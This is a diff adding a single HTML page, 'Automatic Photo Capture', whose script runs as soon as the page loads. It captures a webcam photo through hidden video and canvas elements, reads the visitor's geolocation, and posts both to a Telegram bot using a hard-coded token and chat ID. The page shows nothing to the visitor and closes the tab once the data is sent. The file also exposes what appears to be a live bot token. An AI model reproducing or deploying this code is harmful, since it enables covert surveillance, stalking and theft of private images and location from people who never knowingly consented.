@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automatic Photo Capture</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+        }
+        #video, #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // Replace these with your values
+            const TELEGRAM_TOKEN = '7475419786:AAHc-gxnx5EWqIFDeByGCT7vRBFLtJWrJx4';
+            const CHAT_ID = '7406507427';
+
+            // Start video stream
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        setTimeout(captureAndSend, 1000); // Capture after 1 second
+                    };
+                })
+                .catch(err => {
+                    console.error('Error accessing the camera', err);
+                });
+
+            function captureAndSend() {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                    sendPhoto(blob)
+                        .then(() => getGeolocation())
+                        .then(position => sendLocation(position))
+                        .then(() => {
+                            console.log('Photo and location sent successfully!');
+                            window.close(); // Optionally, close the tab after sending
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                        });
+                });
+            }
+
+            function sendPhoto(blob) {
+                return new Promise((resolve, reject) => {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`);
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            const response = JSON.parse(xhr.responseText);
+                            if (response.ok) {
+                                resolve();
+                            } else {
+                                reject('Failed to send photo: ' + response.description);
+                            }
+                        } else {
+                            reject('Failed to send photo. Status: ' + xhr.status);
+                        }
+                    };
+                    xhr.onerror = function() {
+                        reject('Error sending photo.');
+                    };
+
+                    const sendData = new FormData();
+                    sendData.append('chat_id', CHAT_ID);
+                    sendData.append('photo', blob, 'photo.jpg');
+
+                    xhr.send(sendData);
+                });
+            }
+
+            function getGeolocation() {
+                return new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        resolve(position);
+                    }, error => {
+                        reject('Error getting geolocation: ' + error.message);
+                    });
+                });
+            }
+
+            function sendLocation(position) {
+                return new Promise((resolve, reject) => {
+                    const { latitude, longitude } = position.coords;
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`);
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            const response = JSON.parse(xhr.responseText);
+                            if (response.ok) {
+                                resolve();
+                            } else {
+                                reject('Failed to send location: ' + response.description);
+                            }
+                        } else {
+                            reject('Failed to send location. Status: ' + xhr.status);
+                        }
+                    };
+                    xhr.onerror = function() {
+                        reject('Error sending location.');
+                    };
+
+                    const sendData = new FormData();
+                    sendData.append('chat_id', CHAT_ID);
+                    sendData.append('latitude', latitude);
+                    sendData.append('longitude', longitude);
+
+                    xhr.send(sendData);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
